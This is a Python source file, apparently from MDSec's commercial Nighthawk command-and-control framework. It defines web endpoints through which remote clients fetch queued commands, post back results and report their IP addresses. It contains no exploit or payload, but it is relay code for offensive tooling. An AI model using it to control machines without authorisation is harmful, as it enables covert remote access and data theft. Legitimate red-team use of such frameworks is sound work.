# Copyright 2022 MDSec Consulting Ltd
# Use of this source code is governed by an End User License Agreement,
# details of this agreement can be found in EULA.pdf
# Nighthawk (r)

import falcon
import apimanager

ApiManager = apimanager.ApiManager.get_instance()

class C2StatusResource(object):
	def on_get(self, req, resp):
		resp.status = falcon.HTTP_200
		return

class C2ListCommandsResource(object):
	def on_get(self, req, resp, client_id):
		resp.status = falcon.HTTP_200
		resp.media = ApiManager.c2_listcommands(client_id.lower())
		return

class C2GetCommandResource(object):
	def on_get(self, req, resp, msg_id):
		command = ApiManager.c2_getcommand(msg_id.lower())
		if not command:
			resp.status = falcon.HTTP_500
			return
		
		resp.status = falcon.HTTP_200
		resp.media = {"payload": command}
		return

class C2PutResultResource(object):
	def on_post(self, req, resp, client_id, msg_id):
		if not ApiManager.c2_putresult(client_id.lower(), msg_id.lower(), req.media["payload"]):
			resp.status = falcon.HTTP_500
			return
		
		resp.status = falcon.HTTP_200
		return

class C2NotifyActivityResource(object):
	def on_post(self, req, resp, client_id, listener_name):
		ApiManager.c2_notifyactivity(client_id.lower(), listener_name, req.media["ip"])
		resp.status = falcon.HTTP_200
		return
